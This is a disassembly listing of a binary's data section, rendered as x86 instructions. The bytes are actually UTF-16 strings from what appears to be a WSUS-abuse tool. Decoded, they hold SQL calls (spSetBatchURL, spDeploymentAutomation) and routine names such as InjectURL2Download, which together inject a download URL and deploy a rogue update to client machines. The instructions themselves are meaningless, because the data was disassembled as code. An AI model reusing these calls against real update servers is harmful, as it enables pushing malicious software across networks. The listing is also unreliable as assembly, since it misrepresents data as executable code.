  408fff:	00 61 00             	add    %ah,0x0(%ecx)
  409002:	6e                   	outsb  %ds:(%esi),(%dx)
  409003:	00 67 00             	add    %ah,0x0(%edi)
  409006:	75 00                	jne    0x409008
  409008:	61                   	popa
  409009:	00 67 00             	add    %ah,0x0(%edi)
  40900c:	65 00 3d 00 22 00 65 	add    %bh,%gs:0x65002200
  409013:	00 6e 00             	add    %ch,0x0(%esi)
  409016:	22 00                	and    (%eax),%al
  409018:	20 00                	and    %al,(%eax)
  40901a:	4d                   	dec    %ebp
  40901b:	00 73 00             	add    %dh,0x0(%ebx)
  40901e:	72 00                	jb     0x409020
  409020:	63 00                	arpl   %eax,(%eax)
  409022:	53                   	push   %ebx
  409023:	00 65 00             	add    %ah,0x0(%ebp)
  409026:	76 00                	jbe    0x409028
  409028:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40902c:	69 00 74 00 79 00    	imul   $0x790074,(%eax),%eax
  409032:	3d 00 22 00 01       	cmp    $0x1002200,%eax
  409037:	4d                   	dec    %ebp
  409038:	22 00                	and    (%eax),%al
  40903a:	20 00                	and    %al,(%eax)
  40903c:	49                   	dec    %ecx
  40903d:	00 73 00             	add    %dh,0x0(%ebx)
  409040:	42                   	inc    %edx
  409041:	00 65 00             	add    %ah,0x0(%ebp)
  409044:	74 00                	je     0x409046
  409046:	61                   	popa
  409047:	00 3d 00 22 00 66    	add    %bh,0x66002200
  40904d:	00 61 00             	add    %ah,0x0(%ecx)
  409050:	6c                   	insb   (%dx),%es:(%edi)
  409051:	00 73 00             	add    %dh,0x0(%ebx)
  409054:	65 00 22             	add    %ah,%gs:(%edx)
  409057:	00 26                	add    %ah,(%esi)
  409059:	00 67 00             	add    %ah,0x0(%edi)
  40905c:	74 00                	je     0x40905e
  40905e:	3b 00                	cmp    (%eax),%eax
  409060:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  409065:	00 3b                	add    %bh,(%ebx)
  409067:	00 53 00             	add    %dl,0x0(%ebx)
  40906a:	75 00                	jne    0x40906c
  40906c:	70 00                	jo     0x40906e
  40906e:	70 00                	jo     0x409070
  409070:	6f                   	outsl  %ds:(%esi),(%dx)
  409071:	00 72 00             	add    %dh,0x0(%edx)
  409074:	74 00                	je     0x409076
  409076:	55                   	push   %ebp
  409077:	00 72 00             	add    %dh,0x0(%edx)
  40907a:	6c                   	insb   (%dx),%es:(%edi)
  40907b:	00 26                	add    %ah,(%esi)
  40907d:	00 67 00             	add    %ah,0x0(%edi)
  409080:	74 00                	je     0x409082
  409082:	3b 00                	cmp    (%eax),%eax
  409084:	00 5b 26             	add    %bl,0x26(%ebx)
  409087:	00 6c 00 74          	add    %ch,0x74(%eax,%eax,1)
  40908b:	00 3b                	add    %bh,(%ebx)
  40908d:	00 2f                	add    %ch,(%edi)
  40908f:	00 53 00             	add    %dl,0x0(%ebx)
  409092:	75 00                	jne    0x409094
  409094:	70 00                	jo     0x409096
  409096:	70 00                	jo     0x409098
  409098:	6f                   	outsl  %ds:(%esi),(%dx)
  409099:	00 72 00             	add    %dh,0x0(%edx)
  40909c:	74 00                	je     0x40909e
  40909e:	55                   	push   %ebp
  40909f:	00 72 00             	add    %dh,0x0(%edx)
  4090a2:	6c                   	insb   (%dx),%es:(%edi)
  4090a3:	00 26                	add    %ah,(%esi)
  4090a5:	00 67 00             	add    %ah,0x0(%edi)
  4090a8:	74 00                	je     0x4090aa
  4090aa:	3b 00                	cmp    (%eax),%eax
  4090ac:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  4090b1:	00 3b                	add    %bh,(%ebx)
  4090b3:	00 53 00             	add    %dl,0x0(%ebx)
  4090b6:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  4090ba:	75 00                	jne    0x4090bc
  4090bc:	72 00                	jb     0x4090be
  4090be:	69 00 74 00 79 00    	imul   $0x790074,(%eax),%eax
  4090c4:	42                   	inc    %edx
  4090c5:	00 75 00             	add    %dh,0x0(%ebp)
  4090c8:	6c                   	insb   (%dx),%es:(%edi)
  4090c9:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  4090cd:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  4090d1:	00 6e 00             	add    %ch,0x0(%esi)
  4090d4:	49                   	dec    %ecx
  4090d5:	00 44 00 26          	add    %al,0x26(%eax,%eax,1)
  4090d9:	00 67 00             	add    %ah,0x0(%edi)
  4090dc:	74 00                	je     0x4090de
  4090de:	3b 00                	cmp    (%eax),%eax
  4090e0:	00 5d 26             	add    %bl,0x26(%ebp)
  4090e3:	00 6c 00 74          	add    %ch,0x74(%eax,%eax,1)
  4090e7:	00 3b                	add    %bh,(%ebx)
  4090e9:	00 2f                	add    %ch,(%edi)
  4090eb:	00 53 00             	add    %dl,0x0(%ebx)
  4090ee:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  4090f2:	75 00                	jne    0x4090f4
  4090f4:	72 00                	jb     0x4090f6
  4090f6:	69 00 74 00 79 00    	imul   $0x790074,(%eax),%eax
  4090fc:	42                   	inc    %edx
  4090fd:	00 75 00             	add    %dh,0x0(%ebp)
  409100:	6c                   	insb   (%dx),%es:(%edi)
  409101:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  409105:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  409109:	00 6e 00             	add    %ch,0x0(%esi)
  40910c:	49                   	dec    %ecx
  40910d:	00 44 00 26          	add    %al,0x26(%eax,%eax,1)
  409111:	00 67 00             	add    %ah,0x0(%edi)
  409114:	74 00                	je     0x409116
  409116:	3b 00                	cmp    (%eax),%eax
  409118:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  40911d:	00 3b                	add    %bh,(%ebx)
  40911f:	00 4b 00             	add    %cl,0x0(%ebx)
  409122:	42                   	inc    %edx
  409123:	00 41 00             	add    %al,0x0(%ecx)
  409126:	72 00                	jb     0x409128
  409128:	74 00                	je     0x40912a
  40912a:	69 00 63 00 6c 00    	imul   $0x6c0063,(%eax),%eax
  409130:	65 00 49 00          	add    %cl,%gs:0x0(%ecx)
  409134:	44                   	inc    %esp
  409135:	00 26                	add    %ah,(%esi)
  409137:	00 67 00             	add    %ah,0x0(%edi)
  40913a:	74 00                	je     0x40913c
  40913c:	3b 00                	cmp    (%eax),%eax
  40913e:	00 6b 26             	add    %ch,0x26(%ebx)
  409141:	00 6c 00 74          	add    %ch,0x74(%eax,%eax,1)
  409145:	00 3b                	add    %bh,(%ebx)
  409147:	00 2f                	add    %ch,(%edi)
  409149:	00 4b 00             	add    %cl,0x0(%ebx)
  40914c:	42                   	inc    %edx
  40914d:	00 41 00             	add    %al,0x0(%ecx)
  409150:	72 00                	jb     0x409152
  409152:	74 00                	je     0x409154
  409154:	69 00 63 00 6c 00    	imul   $0x6c0063,(%eax),%eax
  40915a:	65 00 49 00          	add    %cl,%gs:0x0(%ecx)
  40915e:	44                   	inc    %esp
  40915f:	00 26                	add    %ah,(%esi)
  409161:	00 67 00             	add    %ah,0x0(%edi)
  409164:	74 00                	je     0x409166
  409166:	3b 00                	cmp    (%eax),%eax
  409168:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  40916d:	00 3b                	add    %bh,(%ebx)
  40916f:	00 2f                	add    %ch,(%edi)
  409171:	00 45 00             	add    %al,0x0(%ebp)
  409174:	78 00                	js     0x409176
  409176:	74 00                	je     0x409178
  409178:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40917c:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  409180:	64 00 50 00          	add    %dl,%fs:0x0(%eax)
  409184:	72 00                	jb     0x409186
  409186:	6f                   	outsl  %ds:(%esi),(%dx)
  409187:	00 70 00             	add    %dh,0x0(%eax)
  40918a:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40918e:	74 00                	je     0x409190
  409190:	69 00 65 00 73 00    	imul   $0x730065,(%eax),%eax
  409196:	26 00 67 00          	add    %ah,%es:0x0(%edi)
  40919a:	74 00                	je     0x40919c
  40919c:	3b 00                	cmp    (%eax),%eax
  40919e:	27                   	daa
  40919f:	00 2c 00             	add    %ch,(%eax,%eax,1)
  4091a2:	4e                   	dec    %esi
  4091a3:	00 55 00             	add    %dl,0x0(%ebp)
  4091a6:	4c                   	dec    %esp
  4091a7:	00 4c 00 01          	add    %cl,0x1(%eax,%eax,1)
  4091ab:	31 50 00             	xor    %edx,0x0(%eax)
  4091ae:	72 00                	jb     0x4091b0
  4091b0:	65 00 70 00          	add    %dh,%gs:0x0(%eax)
  4091b4:	61                   	popa
  4091b5:	00 72 00             	add    %dh,0x0(%edx)
  4091b8:	65 00 58 00          	add    %bl,%gs:0x0(%eax)
  4091bc:	4d                   	dec    %ebp
  4091bd:	00 4c 00 42          	add    %cl,0x42(%eax,%eax,1)
  4091c1:	00 75 00             	add    %dh,0x0(%ebp)
  4091c4:	6e                   	outsb  %ds:(%esi),(%dx)
  4091c5:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
  4091c9:	00 65 00             	add    %ah,0x0(%ebp)
  4091cc:	74 00                	je     0x4091ce
  4091ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4091cf:	00 43 00             	add    %al,0x0(%ebx)
  4091d2:	6c                   	insb   (%dx),%es:(%edi)
  4091d3:	00 69 00             	add    %ch,0x0(%ecx)
  4091d6:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  4091da:	74 00                	je     0x4091dc
  4091dc:	00 5d 0d             	add    %bl,0xd(%ebp)
  4091df:	00 0a                	add    %cl,(%edx)
  4091e1:	00 46 00             	add    %al,0x0(%esi)
  4091e4:	75 00                	jne    0x4091e6
  4091e6:	6e                   	outsb  %ds:(%esi),(%dx)
  4091e7:	00 63 00             	add    %ah,0x0(%ebx)
  4091ea:	74 00                	je     0x4091ec
  4091ec:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  4091f2:	20 00                	and    %al,(%eax)
  4091f4:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4091f8:	72 00                	jb     0x4091fa
  4091fa:	6f                   	outsl  %ds:(%esi),(%dx)
  4091fb:	00 72 00             	add    %dh,0x0(%edx)
  4091fe:	20 00                	and    %al,(%eax)
  409200:	2d 00 20 00 46       	sub    $0x46002000,%eax
  409205:	00 62 00             	add    %ah,0x0(%edx)
  409208:	50                   	push   %eax
  409209:	00 72 00             	add    %dh,0x0(%edx)
  40920c:	65 00 70 00          	add    %dh,%gs:0x0(%eax)
  409210:	61                   	popa
  409211:	00 72 00             	add    %dh,0x0(%edx)
  409214:	65 00 58 00          	add    %bl,%gs:0x0(%eax)
  409218:	6d                   	insl   (%dx),%es:(%edi)
  409219:	00 6c 00 42          	add    %ch,0x42(%eax,%eax,1)
  40921d:	00 75 00             	add    %dh,0x0(%ebp)
  409220:	6e                   	outsb  %ds:(%esi),(%dx)
  409221:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
  409225:	00 65 00             	add    %ah,0x0(%ebp)
  409228:	54                   	push   %esp
  409229:	00 6f 00             	add    %ch,0x0(%edi)
  40922c:	43                   	inc    %ebx
  40922d:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  409231:	00 65 00             	add    %ah,0x0(%ebp)
  409234:	6e                   	outsb  %ds:(%esi),(%dx)
  409235:	00 74 00 2e          	add    %dh,0x2e(%eax,%eax,1)
  409239:	00 01                	add    %al,(%ecx)
  40923b:	11 68 00             	adc    %ebp,0x0(%eax)
  40923e:	74 00                	je     0x409240
  409240:	74 00                	je     0x409242
  409242:	70 00                	jo     0x409244
  409244:	73 00                	jae    0x409246
  409246:	3a 00                	cmp    (%eax),%al
  409248:	2f                   	das
  409249:	00 2f                	add    %ch,(%edi)
  40924b:	00 00                	add    %al,(%eax)
  40924d:	03 3a                	add    (%edx),%edi
  40924f:	00 00                	add    %al,(%eax)
  409251:	29 2f                	sub    %ebp,(%edi)
  409253:	00 43 00             	add    %al,0x0(%ebx)
  409256:	6f                   	outsl  %ds:(%esi),(%dx)
  409257:	00 6e 00             	add    %ch,0x0(%esi)
  40925a:	74 00                	je     0x40925c
  40925c:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  409260:	74 00                	je     0x409262
  409262:	2f                   	das
  409263:	00 77 00             	add    %dh,0x0(%edi)
  409266:	75 00                	jne    0x409268
  409268:	61                   	popa
  409269:	00 67 00             	add    %ah,0x0(%edi)
  40926c:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  409270:	74 00                	je     0x409272
  409272:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  409276:	78 00                	js     0x409278
  409278:	65 00 00             	add    %al,%gs:(%eax)
  40927b:	0f 68 00             	punpckhbw (%eax),%mm0
  40927e:	74 00                	je     0x409280
  409280:	74 00                	je     0x409282
  409282:	70 00                	jo     0x409284
  409284:	3a 00                	cmp    (%eax),%al
  409286:	2f                   	das
  409287:	00 2f                	add    %ch,(%edi)
  409289:	00 00                	add    %al,(%eax)
  40928b:	71 65                	jno    0x4092f2
  40928d:	00 78 00             	add    %bh,0x0(%eax)
  409290:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  409294:	20 00                	and    %al,(%eax)
  409296:	73 00                	jae    0x409298
  409298:	70 00                	jo     0x40929a
  40929a:	53                   	push   %ebx
  40929b:	00 65 00             	add    %ah,0x0(%ebp)
  40929e:	74 00                	je     0x4092a0
  4092a0:	42                   	inc    %edx
  4092a1:	00 61 00             	add    %ah,0x0(%ecx)
  4092a4:	74 00                	je     0x4092a6
  4092a6:	63 00                	arpl   %eax,(%eax)
  4092a8:	68 00 55 00 52       	push   $0x52005500
  4092ad:	00 4c 00 20          	add    %cl,0x20(%eax,%eax,1)
  4092b1:	00 40 00             	add    %al,0x0(%eax)
  4092b4:	75 00                	jne    0x4092b6
  4092b6:	72 00                	jb     0x4092b8
  4092b8:	6c                   	insb   (%dx),%es:(%edi)
  4092b9:	00 42 00             	add    %al,0x0(%edx)
  4092bc:	61                   	popa
  4092bd:	00 74 00 63          	add    %dh,0x63(%eax,%eax,1)
  4092c1:	00 68 00             	add    %ch,0x0(%eax)
  4092c4:	20 00                	and    %al,(%eax)
  4092c6:	3d 00 4e 00 27       	cmp    $0x27004e00,%eax
  4092cb:	00 3c 00             	add    %bh,(%eax,%eax,1)
  4092ce:	52                   	push   %edx
  4092cf:	00 4f 00             	add    %cl,0x0(%edi)
  4092d2:	4f                   	dec    %edi
  4092d3:	00 54 00 3e          	add    %dl,0x3e(%eax,%eax,1)
  4092d7:	00 3c 00             	add    %bh,(%eax,%eax,1)
  4092da:	69 00 74 00 65 00    	imul   $0x650074,(%eax),%eax
  4092e0:	6d                   	insl   (%dx),%es:(%edi)
  4092e1:	00 20                	add    %ah,(%eax)
  4092e3:	00 46 00             	add    %al,0x0(%esi)
  4092e6:	69 00 6c 00 65 00    	imul   $0x65006c,(%eax),%eax
  4092ec:	44                   	inc    %esp
  4092ed:	00 69 00             	add    %ch,0x0(%ecx)
  4092f0:	67 00 65 00          	add    %ah,0x0(%di)
  4092f4:	73 00                	jae    0x4092f6
  4092f6:	74 00                	je     0x4092f8
  4092f8:	3d 00 22 00 01       	cmp    $0x1002200,%eax
  4092fd:	13 22                	adc    (%edx),%esp
  4092ff:	00 20                	add    %ah,(%eax)
  409301:	00 4d 00             	add    %cl,0x0(%ebp)
  409304:	55                   	push   %ebp
  409305:	00 55 00             	add    %dl,0x0(%ebp)
  409308:	52                   	push   %edx
  409309:	00 4c 00 3d          	add    %cl,0x3d(%eax,%eax,1)
  40930d:	00 22                	add    %ah,(%edx)
  40930f:	00 00                	add    %al,(%eax)
  409311:	2d 22 00 20 00       	sub    $0x200022,%eax
  409316:	55                   	push   %ebp
  409317:	00 53 00             	add    %dl,0x0(%ebx)
  40931a:	53                   	push   %ebx
  40931b:	00 55 00             	add    %dl,0x0(%ebp)
  40931e:	52                   	push   %edx
  40931f:	00 4c 00 3d          	add    %cl,0x3d(%eax,%eax,1)
  409323:	00 22                	add    %ah,(%edx)
  409325:	00 22                	add    %ah,(%edx)
  409327:	00 20                	add    %ah,(%eax)
  409329:	00 2f                	add    %ch,(%edi)
  40932b:	00 3e                	add    %bh,(%esi)
  40932d:	00 3c 00             	add    %bh,(%eax,%eax,1)
  409330:	2f                   	das
  409331:	00 52 00             	add    %dl,0x0(%edx)
  409334:	4f                   	dec    %edi
  409335:	00 4f 00             	add    %cl,0x0(%edi)
  409338:	54                   	push   %esp
  409339:	00 3e                	add    %bh,(%esi)
  40933b:	00 27                	add    %ah,(%edi)
  40933d:	00 01                	add    %al,(%ecx)
  40933f:	25 49 00 6e 00       	and    $0x6e0049,%eax
  409344:	6a 00                	push   $0x0
  409346:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40934a:	74 00                	je     0x40934c
  40934c:	55                   	push   %ebp
  40934d:	00 52 00             	add    %dl,0x0(%edx)
  409350:	4c                   	dec    %esp
  409351:	00 32                	add    %dh,(%edx)
  409353:	00 44 00 6f          	add    %al,0x6f(%eax,%eax,1)
  409357:	00 77 00             	add    %dh,0x0(%edi)
  40935a:	6e                   	outsb  %ds:(%esi),(%dx)
  40935b:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  40935f:	00 61 00             	add    %ah,0x0(%ecx)
  409362:	64 00 00             	add    %al,%fs:(%eax)
  409365:	51                   	push   %ecx
  409366:	0d 00 0a 00 46       	or     $0x46000a00,%eax
  40936b:	00 75 00             	add    %dh,0x0(%ebp)
  40936e:	6e                   	outsb  %ds:(%esi),(%dx)
  40936f:	00 63 00             	add    %ah,0x0(%ebx)
  409372:	74 00                	je     0x409374
  409374:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40937a:	20 00                	and    %al,(%eax)
  40937c:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  409380:	72 00                	jb     0x409382
  409382:	6f                   	outsl  %ds:(%esi),(%dx)
  409383:	00 72 00             	add    %dh,0x0(%edx)
  409386:	20 00                	and    %al,(%eax)
  409388:	2d 00 20 00 46       	sub    $0x46002000,%eax
  40938d:	00 62 00             	add    %ah,0x0(%edx)
  409390:	49                   	dec    %ecx
  409391:	00 6e 00             	add    %ch,0x0(%esi)
  409394:	6a 00                	push   $0x0
  409396:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40939a:	74 00                	je     0x40939c
  40939c:	55                   	push   %ebp
  40939d:	00 72 00             	add    %dh,0x0(%edx)
  4093a0:	6c                   	insb   (%dx),%es:(%edi)
  4093a1:	00 32                	add    %dh,(%edx)
  4093a3:	00 44 00 6f          	add    %al,0x6f(%eax,%eax,1)
  4093a7:	00 77 00             	add    %dh,0x0(%edi)
  4093aa:	6e                   	outsb  %ds:(%esi),(%dx)
  4093ab:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  4093af:	00 61 00             	add    %ah,0x0(%ecx)
  4093b2:	64 00 2e             	add    %ch,%fs:(%esi)
  4093b5:	00 01                	add    %al,(%ecx)
  4093b7:	55                   	push   %ebp
  4093b8:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  4093bc:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  4093c0:	20 00                	and    %al,(%eax)
  4093c2:	73 00                	jae    0x4093c4
  4093c4:	70 00                	jo     0x4093c6
  4093c6:	44                   	inc    %esp
  4093c7:	00 65 00             	add    %ah,0x0(%ebp)
  4093ca:	70 00                	jo     0x4093cc
  4093cc:	6c                   	insb   (%dx),%es:(%edi)
  4093cd:	00 6f 00             	add    %ch,0x0(%edi)
  4093d0:	79 00                	jns    0x4093d2
  4093d2:	6d                   	insl   (%dx),%es:(%edi)
  4093d3:	00 65 00             	add    %ah,0x0(%ebp)
  4093d6:	6e                   	outsb  %ds:(%esi),(%dx)
  4093d7:	00 74 00 41          	add    %dh,0x41(%eax,%eax,1)
  4093db:	00 75 00             	add    %dh,0x0(%ebp)
  4093de:	74 00                	je     0x4093e0
  4093e0:	6f                   	outsl  %ds:(%esi),(%dx)
  4093e1:	00 6d 00             	add    %ch,0x0(%ebp)
  4093e4:	61                   	popa
  4093e5:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  4093e9:	00 6f 00             	add    %ch,0x0(%edi)
  4093ec:	6e                   	outsb  %ds:(%esi),(%dx)
  4093ed:	00 20                	add    %ah,(%eax)
  4093ef:	00 40 00             	add    %al,0x0(%eax)
  4093f2:	72 00                	jb     0x4093f4
  4093f4:	65 00 76 00          	add    %dh,%gs:0x0(%esi)
  4093f8:	69 00 73 00 69 00    	imul   $0x690073,(%eax),%eax
  4093fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4093ff:	00 6e 00             	add    %ch,0x0(%esi)
  409402:	49                   	dec    %ecx
  409403:	00 44 00 20          	add    %al,0x20(%eax,%eax,1)
  409407:	00 3d 00 20 00 00    	add    %bh,0x2000
  40940d:	25 44 00 65 00       	and    $0x650044,%eax
  409412:	70 00                	jo     0x409414
  409414:	6c                   	insb   (%dx),%es:(%edi)
  409415:	00 6f 00             	add    %ch,0x0(%edi)
  409418:	79 00                	jns    0x40941a
  40941a:	6d                   	insl   (%dx),%es:(%edi)
  40941b:	00 65 00             	add    %ah,0x0(%ebp)
  40941e:	6e                   	outsb  %ds:(%esi),(%dx)
  40941f:	00 74 00 52          	add    %dh,0x52(%eax,%eax,1)
  409423:	00 65 00             	add    %ah,0x0(%ebp)
  409426:	76 00                	jbe    0x409428
  409428:	69 00 73 00 69 00    	imul   $0x690073,(%eax),%eax
  40942e:	6f                   	outsl  %ds:(%esi),(%dx)
  40942f:	00 6e 00             	add    %ch,0x0(%esi)
  409432:	00 51 0d             	add    %dl,0xd(%ecx)
  409435:	00 0a                	add    %cl,(%edx)
  409437:	00 46 00             	add    %al,0x0(%esi)
  40943a:	75 00                	jne    0x40943c
  40943c:	6e                   	outsb  %ds:(%esi),(%dx)
  40943d:	00 63 00             	add    %ah,0x0(%ebx)
  409440:	74 00                	je     0x409442
  409442:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  409448:	20 00                	and    %al,(%eax)
  40944a:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40944e:	72 00                	jb     0x409450
  409450:	6f                   	outsl  %ds:(%esi),(%dx)
  409451:	00 72 00             	add    %dh,0x0(%edx)
  409454:	20 00                	and    %al,(%eax)
  409456:	2d 00 20 00 46       	sub    $0x46002000,%eax
  40945b:	00 62 00             	add    %ah,0x0(%edx)
  40945e:	44                   	inc    %esp
  40945f:	00 65 00             	add    %ah,0x0(%ebp)
  409462:	70 00                	jo     0x409464
  409464:	6c                   	insb   (%dx),%es:(%edi)
  409465:	00 6f 00             	add    %ch,0x0(%edi)
  409468:	79 00                	jns    0x40946a
  40946a:	6d                   	insl   (%dx),%es:(%edi)
  40946b:	00 65 00             	add    %ah,0x0(%ebp)
  40946e:	6e                   	outsb  %ds:(%esi),(%dx)
  40946f:	00 74 00 52          	add    %dh,0x52(%eax,%eax,1)
  409473:	00 65 00             	add    %ah,0x0(%ebp)
  409476:	76 00                	jbe    0x409478
  409478:	69 00 73 00 69 00    	imul   $0x690073,(%eax),%eax
  40947e:	6f                   	outsl  %ds:(%esi),(%dx)
  40947f:	00 6e 00             	add    %ch,0x0(%esi)
  409482:	2e 00 01             	add    %al,%cs:(%ecx)
  409485:	81 15 3c 00 75 00 70 	adcl   $0x640070,0x75003c
  40948c:	00 64 00 
  40948f:	3a 00                	cmp    (%eax),%al
  409491:	55                   	push   %ebp
  409492:	00 70 00             	add    %dh,0x0(%eax)
  409495:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  409499:	74 00                	je     0x40949b
  40949b:	65 00 20             	add    %ah,%gs:(%eax)
  40949e:	00 78 00             	add    %bh,0x0(%eax)
  4094a1:	6d                   	insl   (%dx),%es:(%edi)
  4094a2:	00 6c 00 6e          	add    %ch,0x6e(%eax,%eax,1)
  4094a6:	00 73 00             	add    %dh,0x0(%ebx)
  4094a9:	3a 00                	cmp    (%eax),%al
  4094ab:	70 00                	jo     0x4094ad
  4094ad:	75 00                	jne    0x4094af
  4094af:	62 00                	bound  %eax,(%eax)
  4094b1:	3d 00 22 00 68       	cmp    $0x68002200,%eax
  4094b6:	00 74 00 74          	add    %dh,0x74(%eax,%eax,1)
  4094ba:	00 70 00             	add    %dh,0x0(%eax)
  4094bd:	3a 00                	cmp    (%eax),%al
  4094bf:	2f                   	das
  4094c0:	00 2f                	add    %ch,(%edi)
  4094c2:	00 73 00             	add    %dh,0x0(%ebx)
  4094c5:	63 00                	arpl   %eax,(%eax)
  4094c7:	68 00 65 00 6d       	push   $0x6d006500
  4094cc:	00 61 00             	add    %ah,0x0(%ecx)
  4094cf:	73 00                	jae    0x4094d1
  4094d1:	2e 00 6d 00          	add    %ch,%cs:0x0(%ebp)
  4094d5:	69 00 63 00 72 00    	imul   $0x720063,(%eax),%eax
  4094db:	6f                   	outsl  %ds:(%esi),(%dx)
  4094dc:	00 73 00             	add    %dh,0x0(%ebx)
  4094df:	6f                   	outsl  %ds:(%esi),(%dx)
  4094e0:	00 66 00             	add    %ah,0x0(%esi)
  4094e3:	74 00                	je     0x4094e5
  4094e5:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  4094e9:	6f                   	outsl  %ds:(%esi),(%dx)
  4094ea:	00 6d 00             	add    %ch,0x0(%ebp)
  4094ed:	2f                   	das
  4094ee:	00 6d 00             	add    %ch,0x0(%ebp)
  4094f1:	73 00                	jae    0x4094f3
  4094f3:	75 00                	jne    0x4094f5
  4094f5:	73 00                	jae    0x4094f7
  4094f7:	2f                   	das
  4094f8:	00 32                	add    %dh,(%edx)
  4094fa:	00 30                	add    %dh,(%eax)
  4094fc:	00 30                	add    %dh,(%eax)
  4094fe:	00 32                	add    %dh,(%edx)
  409500:	00 2f                	add    %ch,(%edi)
  409502:	00 31                	add    %dh,(%ecx)
  409504:	00 32                	add    %dh,(%edx)
  409506:	00 2f                	add    %ch,(%edi)
  409508:	00 50 00             	add    %dl,0x0(%eax)
  40950b:	75 00                	jne    0x40950d
  40950d:	62 00                	bound  %eax,(%eax)
  40950f:	6c                   	insb   (%dx),%es:(%edi)
  409510:	00 69 00             	add    %ch,0x0(%ecx)
  409513:	73 00                	jae    0x409515
  409515:	68 00 69 00 6e       	push   $0x6e006900
  40951a:	00 67 00             	add    %ah,0x0(%edi)
  40951d:	22 00                	and    (%eax),%al
  40951f:	20 00                	and    %al,(%eax)
  409521:	78 00                	js     0x409523
  409523:	6d                   	insl   (%dx),%es:(%edi)
  409524:	00 6c 00 6e          	add    %ch,0x6e(%eax,%eax,1)
  409528:	00 73 00             	add    %dh,0x0(%ebx)
  40952b:	3a 00                	cmp    (%eax),%al
  40952d:	75 00                	jne    0x40952f
  40952f:	70 00                	jo     0x409531
  409531:	64 00 3d 00 22 00 68 	add    %bh,%fs:0x68002200
  409538:	00 74 00 74          	add    %dh,0x74(%eax,%eax,1)
  40953c:	00 70 00             	add    %dh,0x0(%eax)
  40953f:	3a 00                	cmp    (%eax),%al
  409541:	2f                   	das
  409542:	00 2f                	add    %ch,(%edi)
  409544:	00 73 00             	add    %dh,0x0(%ebx)
  409547:	63 00                	arpl   %eax,(%eax)
  409549:	68 00 65 00 6d       	push   $0x6d006500
  40954e:	00 61 00             	add    %ah,0x0(%ecx)
  409551:	73 00                	jae    0x409553
  409553:	2e 00 6d 00          	add    %ch,%cs:0x0(%ebp)
  409557:	69 00 63 00 72 00    	imul   $0x720063,(%eax),%eax
  40955d:	6f                   	outsl  %ds:(%esi),(%dx)
  40955e:	00 73 00             	add    %dh,0x0(%ebx)
  409561:	6f                   	outsl  %ds:(%esi),(%dx)
  409562:	00 66 00             	add    %ah,0x0(%esi)
  409565:	74 00                	je     0x409567
  409567:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  40956b:	6f                   	outsl  %ds:(%esi),(%dx)
  40956c:	00 6d 00             	add    %ch,0x0(%ebp)
  40956f:	2f                   	das
  409570:	00 6d 00             	add    %ch,0x0(%ebp)
  409573:	73 00                	jae    0x409575
  409575:	75 00                	jne    0x409577
  409577:	73 00                	jae    0x409579
  409579:	2f                   	das
  40957a:	00 32                	add    %dh,(%edx)
  40957c:	00 30                	add    %dh,(%eax)
  40957e:	00 30                	add    %dh,(%eax)
  409580:	00 32                	add    %dh,(%edx)
  409582:	00 2f                	add    %ch,(%edi)
  409584:	00 31                	add    %dh,(%ecx)
  409586:	00 32                	add    %dh,(%edx)
  409588:	00 2f                	add    %ch,(%edi)
  40958a:	00 55 00             	add    %dl,0x0(%ebp)
  40958d:	70 00                	jo     0x40958f
  40958f:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  409593:	74 00                	je     0x409595
  409595:	65 00 22             	add    %ah,%gs:(%edx)
  409598:	00 3e                	add    %bh,(%esi)
  40959a:	00 00                	add    %al,(%eax)
  40959c:	33 22                	xor    (%edx),%esp
  40959e:	00 20                	add    %ah,(%eax)
  4095a0:	00 52 00             	add    %dl,0x0(%edx)
  4095a3:	65 00 76 00          	add    %dh,%gs:0x0(%esi)
  4095a7:	69 00 73 00 69 00    	imul   $0x690073,(%eax),%eax
  4095ad:	6f                   	outsl  %ds:(%esi),(%dx)
  4095ae:	00 6e 00             	add    %ch,0x0(%esi)
  4095b1:	4e                   	dec    %esi
  4095b2:	00 75 00             	add    %dh,0x0(%ebp)
  4095b5:	6d                   	insl   (%dx),%es:(%edi)
  4095b6:	00 62 00             	add    %ah,0x0(%edx)
  4095b9:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
